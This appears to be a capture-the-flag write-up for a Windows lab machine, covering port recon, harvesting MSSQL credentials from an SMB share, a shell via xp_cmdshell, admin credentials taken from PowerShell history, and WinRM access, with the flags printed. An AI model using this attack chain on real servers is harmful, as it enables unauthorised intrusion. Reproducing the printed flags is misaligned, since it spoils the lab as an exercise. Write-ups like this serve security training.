# Archetype — Tier 2

**Target:** `10.129.95.187` — Windows Server 2019 Standard (MSSQL + SMB)

## Recon

```
PORT     STATE  SERVICE      VERSION
135/tcp  open   msrpc        Microsoft Windows RPC
139/tcp  open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds Windows Server 2019 Standard 17763
1433/tcp open   ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00
5985/tcp open   http         Microsoft HTTPAPI httpd 2.0 (WinRM)
```

## Exploitation

### Step 1 — SMB Null Session & MSSQL Credentials

Connected to SMB share `backups` via null session and found `prod.dtsConfig` containing MSSQL credentials:

| User | Password |
|------|----------|
| `ARCHETYPE\sql_svc` | `M3g4c0rp123` |

### Step 2 — MSSQL Shell via Impacket

```
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

Enabled `xp_cmdshell` and got a shell as `sql_svc`.

### Step 3 — PowerShell History → Admin Credentials

Found admin creds in PowerShell history:
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

| User | Password |
|------|----------|
| `administrator` | `MEGACORP_4dm1n!!` |

### Step 4 — WinRM as Administrator

Used `evil-winrm` with the admin credentials to get a shell as Administrator.

## Flags

| Flag | Value |
|------|-------|
| User | `3e7b102e78218e935bf3f4951fec21a3` |
| Root | `b91ccec3305e98240082d4474b848528` |
